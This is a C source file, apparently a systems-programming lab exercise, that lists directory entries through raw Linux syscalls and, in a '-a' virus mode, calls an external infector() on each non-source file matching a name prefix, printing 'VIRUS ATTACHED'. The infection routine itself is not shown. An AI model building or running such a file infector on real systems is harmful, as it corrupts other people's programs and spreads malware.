#include "util.h"

#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define SYS_EXIT 1
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291
#define SYS_GETDENTS 141
#define SYS_CLOSE 6
#define NULL 0


int virus_mode = 0;
char* prefix = NULL;

extern int system_call();
extern void infector(char*);
extern void infection();

struct linux_dirent {
    unsigned long d_ino;      
    unsigned long d_off;       
    unsigned short d_reclen;   
    char d_name[];            
};


int isSourceFile(char *name){
int name_len = strlen(name);
if (name_len > 2 && 
    ((name[name_len-1] == 'c' && name[name_len-2] == '.') ||
     (name[name_len-1] == 's' && name[name_len-2] == '.') ||
     (name[name_len-1] == 'o' && name[name_len-2] == '.'))) {
    return 1;
}
return 0;
}

int main (int argc , char* argv[], char* envp[])
{

    int i;
    for (i = 1; i < argc; i++) {
        if (strncmp(argv[i], "-a", 2) == 0) {
            virus_mode = 1;
            prefix = argv[i] + 2;  
        }
    } 


    int fd = system_call(SYS_OPEN, ".", 0, 0);
    if (fd < 0){
        system_call(SYS_EXIT, 0x66, 0, 0);  
    }

    char buffer[10000];
    int bytes_read = system_call(SYS_GETDENTS, fd, buffer, 10000);
    
    int position = 0;
    while (position < bytes_read) {
    struct linux_dirent *d = (struct linux_dirent *)(buffer + position);
    char *name = d->d_name;

    if (virus_mode && strncmp(name,prefix,strlen(prefix))==0 && isSourceFile(name)==0) {
        system_call(SYS_WRITE, STDOUT, name, strlen(name));
        system_call(SYS_WRITE, STDOUT, " - VIRUS ATTACHED\n", 19);
        infector(name);
    } else {
        system_call(SYS_WRITE, STDOUT, name, strlen(name));
        system_call(SYS_WRITE, STDOUT, "\n", 1);
    }

   
    
    position += d->d_reclen;
}

system_call(SYS_CLOSE, fd, 0, 0);

return 0;
}


